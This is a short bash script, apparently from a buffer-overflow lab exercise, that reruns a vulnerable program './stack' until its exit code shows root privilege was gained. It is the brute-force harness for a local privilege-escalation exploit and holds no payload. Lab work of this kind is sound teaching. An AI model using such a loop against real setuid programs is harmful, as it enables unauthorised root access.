#!/bin/bash

# whilebash.sh
# Description: * simple bash script loop to call vulnerable program
#                ./stack (has buffer overflow vulnerability)
#
# Usage: whilebash.sh
# Arguments:
#    None

gotroot=0
while [ $gotroot -eq 0 ]
do
    ./stack
    result=$?
    # If root privilege is obtained (and properly exited),
    # result will be equal to zero here
    if [ $result -eq 0 ]
    then
        #echo "Got root"
        gotroot=1
    fi
done

